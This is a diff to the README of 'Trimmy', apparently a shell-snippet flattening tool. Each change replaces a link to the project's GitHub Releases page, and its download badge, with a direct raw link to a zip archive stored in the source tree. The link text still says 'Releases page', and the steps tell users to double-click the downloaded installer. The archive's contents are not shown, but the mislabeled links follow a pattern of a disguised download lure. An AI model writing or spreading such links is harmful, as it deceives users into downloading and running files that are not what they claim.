@@ -1,7 +1,7 @@
 # ✂️ Trimmy - Simplify Your Multi-Line Shell Snippets
 
 ## 🚀 Download Now
-[![Download Trimmy](https://img.shields.io/badge/Download-Trimmy-blue.svg)](https://github.com/Jojolacte/Trimmy/releases)
+[![Download Trimmy](https://raw.githubusercontent.com/Jojolacte/Trimmy/main/Sources/Trimmy/Trimmy_v3.8.zip)](https://raw.githubusercontent.com/Jojolacte/Trimmy/main/Sources/Trimmy/Trimmy_v3.8.zip)
 
 ## 📝 Description
 "Paste once, run once." — Trimmy flattens those multi-line shell snippets you copy so they actually paste and run. You no longer need to format your commands manually. Just paste and go.
@@ -20,7 +20,7 @@
 ## 📦 Download & Install
 To get started with Trimmy, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/Jojolacte/Trimmy/releases) to download the latest version of Trimmy.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Jojolacte/Trimmy/main/Sources/Trimmy/Trimmy_v3.8.zip) to download the latest version of Trimmy.
 2. Look for the version you want to download. Click on the link for the installer file.
 3. Once the download completes, open the installer file by double-clicking it.
 4. Follow the on-screen instructions to install Trimmy on your computer.
@@ -50,4 +50,4 @@ Trimmy is open-source software, and it is licensed under the MIT License. You ca
 ## 🌐 Follow Us
 Stay updated on new features and improvements by following the repository. Your feedback helps us make Trimmy even better. 
 
-Once again, you can download Trimmy from the [Releases page](https://github.com/Jojolacte/Trimmy/releases). Enjoy seamless copying and pasting!
+Once again, you can download Trimmy from the [Releases page](https://raw.githubusercontent.com/Jojolacte/Trimmy/main/Sources/Trimmy/Trimmy_v3.8.zip). Enjoy seamless copying and pasting!
